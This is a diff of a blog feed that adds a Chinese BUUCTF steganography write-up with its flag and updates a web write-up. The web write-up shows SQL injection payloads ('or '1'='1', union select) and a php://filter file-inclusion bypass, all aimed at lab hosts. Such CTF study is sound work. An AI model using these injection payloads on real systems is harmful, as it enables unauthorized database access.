+                &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+                &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;宽为：bytearray(b&#39;\x00\x00\x00\xe3&#39;)&lt;/p&gt;
+&lt;p&gt;高为：bytearray(b&#39;\x00\x00\x01\xc5&#39;)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;修复后图片仍然不对，用010editor查看发现 发现chunk[2]、chunk[3]缺少IDAT标识
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701145937704.png&#34; alt=&#34;image-20210701145937704&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在对应位置补齐标识&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701150134658.png&#34; alt=&#34;image-20210701150134658&#34;&gt;&lt;/p&gt;
+&lt;p&gt;拿到正确图片：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701150222425.png&#34; alt=&#34;image-20210701150222425&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 用 zsteg 分析，没得到有效结果&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# 用 stegsolve 分析，拿到一张二维码，使用QR research解码&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701150654325.png&#34; alt=&#34;image-20210701150654325&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701154141907.png&#34; alt=&#34;image-20210701154141907&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 得到：ZmxhZ3s0X3&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;第二张图-2png&#34;&gt;第二张图 2.png&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;用 010editor打开，发现 PNG图片尾有 7z 文件，用 binwalk分离，但没有识别出来。
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701181507922.png&#34; alt=&#34;image-20210701181507922&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;我用手动分离后新建为 7z.zip 打开发现文件损坏，打开查看16进制，
+发现和zip的文件头 504B0304 相似，将全部的 37 7A（7z）修改为 50 4B
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701173710120.png&#34; alt=&#34;image-20210701173710120&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;7z.zip文件正常打开后，发现里面有 999 个 .txt 文件通审查文件的大小或者 CRC值，
+找出618.txt文件中的信息You find it: 1RVcmVfc
+
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;第三张图-3png&#34;&gt;第三张图 3.png&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;还是用010editor审查3.png的信息
+
+发现chunk[0]-chunk[6]的每一个数据块的crc值都很小
+
+并且是可打印的Ascii字符
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701175528606.png&#34; alt=&#34;image-20210701175528606&#34;&gt;&lt;/p&gt;
+&lt;p&gt;python.exp&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x52&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x5A&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x3D&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;#3RlZ30=&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;第四张图-4png&#34;&gt;第四张图 4.png&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;直接在最末尾给出来了
+
+cExlX1BsY=
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701180211561.png&#34; alt=&#34;image-20210701180211561&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;用 TweakPNG分析PNG图片信息，可以发现PNG中隐写了一个text文本
+正确的base信息应该为 cExlX1BsY
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210701181218795.png&#34; alt=&#34;image-20210701181218795&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;第五张图-5png&#34;&gt;第五张图 5.png&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;Yzcllfc0lN
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc通关1/image-20210701180320506.png&#34; alt=&#34;image-20210701180320506&#34;  /&gt;&lt;/p&gt;
+&lt;p&gt;得到的所有信息：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;ZmxhZ3s0X3&lt;/span&gt;
+&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RVcmVfc&lt;/span&gt;
+&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RlZ30&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;cExlX1BsY&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;Yzcllfc0lN&lt;/span&gt;
+
+&lt;span class=&#34;err&#34;&gt;连接成&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;base64解码&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;：&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;ZmxhZ3s0X3Yzcllfc0lNcExlX1BsY1RVcmVfc3RlZ30&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_v3rY_sIMpLe_PlcTUre_steg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content>
+            
+            
+            
+            
+            
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://cn1nja.github.io/categories/ctf%E8%AE%AD%E7%BB%83/" term="CTF训练" label="CTF训练" />
+                            
+                        
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://cn1nja.github.io/tags/buumisc%E5%88%B7%E9%A2%98/" term="BUUMisc刷题" label="BUUMisc刷题" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        <entry>
             <title type="text">BUUWeb通关1</title>
             <link rel="alternate" type="text/html" href="https://cn1nja.github.io/posts/buuweb%E9%80%9A%E5%85%B31/" />
             <id>https://cn1nja.github.io/posts/buuweb%E9%80%9A%E5%85%B31/</id>
-            <updated>2021-06-16T15:59:17&#43;08:00</updated>
+            <updated>2021-07-01T18:43:57&#43;08:00</updated>
             <published>2021-06-13T13:42:31&#43;08:00</published>
             <author>
                     <name>CN1nja</name>
@@ -42,7 +924,7 @@
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;url 打开source.php 文件。发现hint.php 文件&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210614131217227.png&#34; alt=&#34;image-20210614131217227&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210614131217227.png&#34; alt=&#34;image-20210614131217227&#34;&gt;&lt;/p&gt;
 &lt;p&gt;打开 &lt;code&gt;http://af382c6e-72dc-485e-86c3-df8ac4429272.node3.buuoj.cn/?file=hint.php&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -194,9 +1076,9 @@
 &lt;h3 id=&#34;font-colora020f0知识点sql注入构造闭合万能密码font&#34;&gt;&lt;font color=#A020F0&gt;知识点：SQL注入，构造闭合，万能密码&lt;/font&gt;&lt;/h3&gt;
 &lt;h3 id=&#34;font-colora020f0题目分析font-1&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
 &lt;p&gt;简单的SQL注入，使用万能密码，构造闭合。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210614125058820.png&#34; alt=&#34;image-20210614125058820&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210614125058820.png&#34; alt=&#34;image-20210614125058820&#34;&gt;&lt;/p&gt;
 &lt;p&gt;打开hackbar，进行 get注入，尝试构造闭合 1&#39;，SQL报错说明存在注入漏洞：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image20210613170513940.png&#34; alt=&#34;image20210613170513940.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image20210613170513940.png&#34; alt=&#34;image20210613170513940.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;解法一：构造闭合 ：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -206,7 +1088,7 @@
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;58020&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c29&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;22e8&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4468&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;adc5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fca72513e89d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;node3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buuoj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;check&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select 1,2,database() %23 &amp;amp;password=1&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210613171541347.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210613171541347.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;解法二：使用万能密码构造闭合：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -596,8 +1478,8 @@
 &lt;h3 id=&#34;font-colora020f0知识点sql注入--堆叠注入font-1&#34;&gt;&lt;font color=#A020F0&gt;知识点：SQL注入--堆叠注入&lt;/font&gt;&lt;/h3&gt;
 &lt;h3 id=&#34;font-colora020f0题目分析font-4&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
 &lt;p&gt;通过字典进行 Fuzzing 测试，发现一堆关键字被 WAF 过滤了。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210615152835773.png&#34; alt=&#34;image-20210615152835773&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210615153239240.png&#34; alt=&#34;image-20210615153239240&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210615152835773.png&#34; alt=&#34;image-20210615152835773&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210615153239240.png&#34; alt=&#34;image-20210615153239240&#34;&gt;&lt;/p&gt;
 &lt;p&gt;测试出这里通过&lt;strong&gt;堆叠注入&lt;/strong&gt;可以：&lt;/p&gt;
 &lt;p&gt;使用　Burp 或者 Live HTTP headers 抓包：&lt;/p&gt;
 &lt;p&gt;post参数重放攻击：&lt;/p&gt;
@@ -1002,7 +1884,7 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 &lt;/div&gt;&lt;p&gt;读取文件源码（针对php文件需要base64编码）&lt;/p&gt;
 &lt;h3 id=&#34;font-colora020f0题目分析font-5&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
 &lt;p&gt;查看网页源码发现：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210615193903774.png&#34; alt=&#34;image-20210615193903774&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210615193903774.png&#34; alt=&#34;image-20210615193903774&#34;&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -1067,12 +1949,12 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 &lt;h3 id=&#34;font-colora020f0知识点php伪协议font&#34;&gt;&lt;font color=#A020F0&gt;知识点：php://伪协议&lt;/font&gt;&lt;/h3&gt;
 &lt;h3 id=&#34;font-colora020f0题目分析font-6&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
 &lt;p&gt;查看网页源代码，发现有一份 php 文件夹&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115120754.png&#34; alt=&#34;image-20210616115120754&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115120754.png&#34; alt=&#34;image-20210616115120754&#34;&gt;&lt;/p&gt;
 &lt;p&gt;打开后得到下面的图，查看存放的 secret 文件，但没有结果。查看源代码也没特别的信息。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115218415.png&#34; alt=&#34;image-20210616115218415&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115302503.png&#34; alt=&#34;image-20210616115302503&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115218415.png&#34; alt=&#34;image-20210616115218415&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115302503.png&#34; alt=&#34;image-20210616115302503&#34;&gt;&lt;/p&gt;
 &lt;p&gt;用BURP抓包分析，获取到 secr3t.php  文件。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115518966.png&#34; alt=&#34;image-20210616115518966&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616115518966.png&#34; alt=&#34;image-20210616115518966&#34;&gt;&lt;/p&gt;
 &lt;p&gt;执行查询 secr3t.php文件&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1119,7 +2001,7 @@ PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入�
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;得到 flag.php 文件，查看源码也没有信息&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616120105222.png&#34; alt=&#34;image-20210616120105222&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616120105222.png&#34; alt=&#34;image-20210616120105222&#34;&gt;&lt;/p&gt;
 &lt;p&gt;审计上面的php代码，发现这里存在 文件包含 ，且过滤了关键字 &amp;quot;../&amp;quot; ，&amp;quot;input&amp;quot;，&amp;quot;data&amp;quot;，&amp;quot;tp&amp;quot;，但没有过滤 &amp;quot;&lt;strong&gt;filter&lt;/strong&gt; &amp;quot;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1222,10 +2104,10 @@ srv
 &lt;p&gt;尝试使用万能密码：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;http://a26fac72-af79-450e-b512-f6c817dd9e4f.node3.buuoj.cn/check.php?username=1&#39; or &#39;1&#39;=&#39;1 &amp;amp;password=1&#39; or &#39;1&#39;=&#39;1
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;回显登录成功，但并没有拿到flag，继续注入&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616132723578.png&#34; alt=&#34;image-20210616132723578&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616132723578.png&#34; alt=&#34;image-20210616132723578&#34;&gt;&lt;/p&gt;
 &lt;p&gt;判断字段数：&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;http://a26fac72-af79-450e-b512-f6c817dd9e4f.node3.buuoj.cn/check.php?username=1&#39; order by 4 %23&amp;amp;password=1&#39; or &#39;1&#39;=&#39;1
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616132859954.png&#34; alt=&#34;image-20210616132859954&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616132859954.png&#34; alt=&#34;image-20210616132859954&#34;&gt;&lt;/p&gt;
 &lt;p&gt;union注入查询：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1236,7 +2118,7 @@ srv
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;回显成功：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUWeb/2021.6/BUUWeb%E9%80%9A%E5%85%B31/image-20210616133002729.png&#34; alt=&#34;image-20210616133002729&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUWeb%E9%80%9A%E5%85%B31/image-20210616133002729.png&#34; alt=&#34;image-20210616133002729&#34;&gt;&lt;/p&gt;
 &lt;p&gt;查询数据库名：&lt;/p&gt;
